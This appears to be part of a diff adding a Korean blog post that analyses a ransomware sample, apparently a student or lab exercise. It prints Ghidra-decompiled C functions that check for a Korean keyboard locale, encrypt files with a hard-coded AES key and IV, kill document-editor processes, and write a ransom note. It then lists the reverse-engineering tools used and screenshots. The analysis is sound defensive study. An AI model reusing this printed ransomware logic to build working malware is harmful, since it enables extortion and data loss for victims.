+  <span class="n">AllocConsole</span><span class="p">();</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">FindWindowA</span><span class="p">(</span><span class="s">"ConsoleWindowClass"</span><span class="p">,(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="p">(</span><span class="n">HWND</span><span class="p">)</span><span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">ShowWindow</span><span class="p">(</span><span class="n">local_10</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_00412b00</span><span class="p">();</span> <span class="c1">// 키보드 언어 확인</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">local_19</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">local_a0</span> <span class="o">=</span> <span class="n">EVP_enc_null</span><span class="p">();</span>
+    <span class="n">local_ac</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">gmm</span><span class="se">\\</span><span class="s">Desktop</span><span class="se">\\</span><span class="s">test"</span><span class="p">;</span>
+    <span class="n">puVar3</span> <span class="o">=</span> <span class="n">local_1c4</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+      <span class="o">*</span><span class="n">puVar3</span> <span class="o">=</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+      <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">puVar3</span> <span class="o">=</span> <span class="n">puVar3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)</span><span class="n">puVar3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined2</span> <span class="o">*</span><span class="p">)</span><span class="n">puVar2</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">local_1aa</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xea</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_1c4</span><span class="p">,</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">local_2d0</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_1c4</span><span class="p">);</span>
+    <span class="n">strcat</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_1c4</span><span class="p">,</span><span class="s">"*"</span><span class="p">);</span>
+    <span class="n">OPENSSL_init_crypto</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">local_a0</span> <span class="o">=</span> <span class="n">EVP_get_cipherbyname</span><span class="p">(</span><span class="s">"aes-128-cbc"</span><span class="p">);</span>
+    <span class="n">local_28</span> <span class="o">=</span> <span class="n">EVP_CIPHER_key_length</span><span class="p">(</span><span class="n">local_a0</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">local_7c</span><span class="p">,</span><span class="s">"password01234567"</span><span class="p">,</span><span class="n">local_28</span><span class="p">);</span>
+    <span class="n">local_34</span> <span class="o">=</span> <span class="n">EVP_CIPHER_iv_length</span><span class="p">(</span><span class="n">local_a0</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">local_94</span><span class="p">,</span><span class="s">"iv12345678901234"</span><span class="p">,</span><span class="n">local_34</span><span class="p">);</span>
+    <span class="n">local_ac</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">_findfirst64i32</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_1c4</span><span class="p">,(</span><span class="n">_finddata64i32_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_0041a168</span><span class="p">);</span>
+    <span class="n">local_b8</span> <span class="o">=</span> <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">local_b8</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">thunk_FUN_00412350</span><span class="p">(</span><span class="s">"No such file or directory</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">unaff_DI</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="n">_findnext64i32</span><span class="p">(</span><span class="n">local_b8</span><span class="p">,(</span><span class="n">_finddata64i32_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_0041a168</span><span class="p">);</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+      <span class="n">thunk_FUN_00411d80</span><span class="p">(</span><span class="n">local_2d0</span><span class="p">,</span><span class="n">local_a0</span><span class="p">,</span><span class="n">local_ac</span><span class="p">,</span><span class="n">local_7c</span><span class="p">,</span><span class="n">local_94</span><span class="p">);</span>
+			<span class="c1">// 파일 암호화</span>
+    <span class="p">}</span>
+    <span class="n">_findclose</span><span class="p">(</span><span class="n">local_b8</span><span class="p">);</span>
+    <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+    <span class="n">local_2ec</span> <span class="o">=</span> <span class="s">"notepad.exe"</span><span class="p">;</span>
+    <span class="n">local_2e8</span> <span class="o">=</span> <span class="s">"WINWORD.EXE"</span><span class="p">;</span>
+    <span class="n">local_2e4</span> <span class="o">=</span> <span class="s">"wordpad.exe"</span><span class="p">;</span>
+    <span class="n">local_2e0</span> <span class="o">=</span> <span class="s">"Hwp.exe"</span><span class="p">;</span>
+    <span class="n">local_2dc</span> <span class="o">=</span> <span class="s">"Microsoft.Photos.exe"</span><span class="p">;</span>
+    <span class="n">local_2f8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="mi">4</span> <span class="o">&lt;</span> <span class="n">local_2f8</span><span class="p">)</span> <span class="p">{</span>
+	      <span class="n">thunk_FUN_004118f0</span><span class="p">();</span> <span class="c1">// 랜섬노트 생성</span>
+        <span class="n">thunk_FUN_004119f0</span><span class="p">(</span><span class="n">local_2d0</span><span class="p">);</span> <span class="c1">// 일정 기간이후 파일 삭제</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_004123f0</span><span class="p">((</span><span class="o">&amp;</span><span class="n">local_2ec</span><span class="p">)[</span><span class="n">local_2f8</span><span class="p">],</span><span class="s">"EXIT"</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+      <span class="n">thunk_FUN_004128d0</span><span class="p">((</span><span class="o">&amp;</span><span class="n">local_2ec</span><span class="p">)[</span><span class="n">local_2f8</span><span class="p">]);</span> <span class="c1">// 프로세스 킬</span>
+      <span class="n">local_2f8</span> <span class="o">=</span> <span class="n">local_2f8</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">thunk_FUN_00412350</span><span class="p">(</span><span class="s">"current language is not Korean"</span><span class="p">,</span><span class="n">unaff_DI</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412e7f</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">,(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00412780</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412f60</span><span class="p">();</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="mh">0x41277b</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="킬-프로세스">킬 프로세스</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">FUN_004128d0</span><span class="p">(</span><span class="n">uchar</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">uVar3</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">uVar4</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_21c</span> <span class="p">[</span><span class="mi">49</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_158</span><span class="p">;</span>
+  <span class="n">HANDLE</span> <span class="n">local_14c</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_140</span> <span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+  <span class="n">DWORD</span> <span class="n">local_138</span><span class="p">;</span>
+  <span class="n">uchar</span> <span class="n">local_11c</span> <span class="p">[</span><span class="mi">268</span><span class="p">];</span>
+  <span class="n">HANDLE</span> <span class="n">local_10</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_8</span><span class="p">;</span>
+
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="mh">0x86</span><span class="p">;</span>
+  <span class="n">puVar2</span> <span class="o">=</span> <span class="n">local_21c</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">puVar2</span> <span class="o">=</span> <span class="mh">0xcccccccc</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="n">DAT_0041a01c</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412f22</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041d06b</span><span class="p">);</span>
+  <span class="n">uVar4</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0xffffffff</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">thunk_FUN_00412350</span><span class="p">(</span><span class="s">"CreateToolhelp32Snapshot error! </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="n">uVar4</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">local_140</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x128</span><span class="p">;</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">local_10</span><span class="p">,</span><span class="n">local_140</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">thunk_FUN_00412350</span><span class="p">(</span><span class="s">"Process32First error! </span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="n">uVar4</span><span class="p">);</span>
+      <span class="n">CloseHandle</span><span class="p">(</span><span class="n">local_10</span><span class="p">);</span>
+      <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">local_14c</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+      <span class="n">local_158</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">do</span> <span class="p">{</span>
+        <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_004123f0</span><span class="p">(</span><span class="n">local_11c</span><span class="p">,</span><span class="n">param_1</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">OpenProcess</span><span class="p">(</span><span class="mh">0x1fffff</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">local_138</span><span class="p">);</span>
+          <span class="n">local_14c</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">uVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span><span class="p">)</span><span class="n">uVar4</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">local_14c</span> <span class="o">!=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">TerminateProcess</span><span class="p">(</span><span class="n">local_14c</span><span class="p">,</span><span class="mh">0xffffffff</span><span class="p">);</span>
+          <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+          <span class="n">local_158</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+          <span class="n">CloseHandle</span><span class="p">(</span><span class="n">local_14c</span><span class="p">);</span>
+          <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+          <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">iVar1</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">local_10</span><span class="p">,</span><span class="n">local_140</span><span class="p">);</span>
+        <span class="n">uVar3</span> <span class="o">=</span> <span class="p">(</span><span class="n">undefined</span><span class="p">)</span><span class="n">uVar4</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+      <span class="n">CloseHandle</span><span class="p">(</span><span class="n">local_10</span><span class="p">);</span>
+      <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">local_158</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_14c</span> <span class="o">!=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0x0</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">thunk_FUN_00412350</span><span class="p">(</span><span class="s">"Kill process fail. Try again! </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">uVar3</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="n">thunk_FUN_00412e7f</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">,(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00412a74</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412f60</span><span class="p">();</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mh">0x412a6f</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="키보드-확인">키보드 확인</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">FUN_00412b00</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">local_20c</span> <span class="p">[</span><span class="mi">49</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_148</span><span class="p">;</span>
+  <span class="n">DWORD</span> <span class="n">local_13c</span> <span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+  <span class="n">DWORD</span> <span class="n">local_130</span> <span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+  <span class="n">BYTE</span> <span class="n">local_124</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
+  <span class="n">HKEY</span> <span class="n">local_1c</span> <span class="p">[</span><span class="mi">3</span><span class="p">];</span>
+  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">local_8</span><span class="p">;</span>
+
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="mh">0x82</span><span class="p">;</span>
+  <span class="n">puVar2</span> <span class="o">=</span> <span class="n">local_20c</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">iVar1</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="o">*</span><span class="n">puVar2</span> <span class="o">=</span> <span class="mh">0xcccccccc</span><span class="p">;</span>
+    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">puVar2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="n">DAT_0041a01c</span> <span class="o">^</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412f22</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_0041d091</span><span class="p">);</span>
+  <span class="n">RegOpenKeyExA</span><span class="p">((</span><span class="n">HKEY</span><span class="p">)</span><span class="mh">0x80000001</span><span class="p">,</span><span class="s">"Control Panel</span><span class="se">\\</span><span class="s">International"</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20019</span><span class="p">,(</span><span class="n">PHKEY</span><span class="p">)</span><span class="n">local_1c</span><span class="p">);</span>
+  <span class="n">local_10</span> <span class="o">=</span> <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">memset</span><span class="p">(</span><span class="n">local_124</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+    <span class="n">local_13c</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
+    <span class="n">RegQueryValueExA</span><span class="p">(</span><span class="n">local_1c</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="s">"sLanguage"</span><span class="p">,(</span><span class="n">LPDWORD</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="n">local_130</span><span class="p">,</span><span class="n">local_124</span><span class="p">,</span><span class="n">local_13c</span><span class="p">);</span>
+    <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+    <span class="n">RegCloseKey</span><span class="p">(</span><span class="n">local_1c</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="n">local_148</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_124</span><span class="p">,</span><span class="s">"KOR"</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412e7f</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack0xfffffffc</span><span class="p">,(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_00412c20</span><span class="p">);</span>
+  <span class="n">thunk_FUN_00412f60</span><span class="p">();</span>
+  <span class="n">local_8</span> <span class="o">=</span> <span class="mh">0x412c1a</span><span class="p">;</span>
+  <span class="n">thunk_FUN_00412ee8</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>사용툴 :  Exeinfo PE, Bin Text, PEview, Process Monitor, processHacker, OllyDBG</p>
+
+<p>Exeinfo PE(PE파일 분석툴)을 사용하여
+패킹여부 확인 및 사용언어 C++ 확인 [빌드에 사용된 프로그램 Visual studio사용 확인]</p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869491-bdc68380-2c0e-11eb-82cb-03b3149eacd9.jpg" alt="s1-1" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869527-00885b80-2c0f-11eb-86b0-d0c6420e2b4a.jpg" alt="s1-2" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869544-2dd50980-2c0f-11eb-9b69-bc46198edb8d.gif" alt="s1-3" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869630-07fc3480-2c10-11eb-99e6-e9c78cfadd8a.jpg" alt="s1-4" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869637-0cc0e880-2c10-11eb-8159-0637b43e1b9e.jpg" alt="s1-5" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869638-0d597f00-2c10-11eb-8bac-a7e13642c5c9.jpg" alt="s1-6" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869650-19ddd780-2c10-11eb-91b6-d9f63f8208d5.jpg" alt="s1-7" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869651-1b0f0480-2c10-11eb-9b61-186b6ceb81ce.jpg" alt="s1-8" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869652-1c403180-2c10-11eb-9200-060bcf0c823e.jpg" alt="s1-9" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869653-1cd8c800-2c10-11eb-9980-65d134ae33ec.jpg" alt="s1-10" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869654-1d715e80-2c10-11eb-9de4-777f8cbd3f3c.jpg" alt="s1-11" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869655-1ea28b80-2c10-11eb-8863-dadb18ac4600.jpg" alt="s1-12" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869656-1f3b2200-2c10-11eb-9fcd-bc28a08ec3d6.jpg" alt="s1-13" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869657-1f3b2200-2c10-11eb-8a8a-023edbd85ab4.jpg" alt="s1-14" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869658-206c4f00-2c10-11eb-8f0f-b5d88e5212ff.jpg" alt="s1-15" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869660-2104e580-2c10-11eb-965a-e8135bffa7e3.jpg" alt="s1-16" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/65612054/99869661-219d7c00-2c10-11eb-98ef-b238b4f92144.jpg" alt="s1-17" /></p>
+:ET
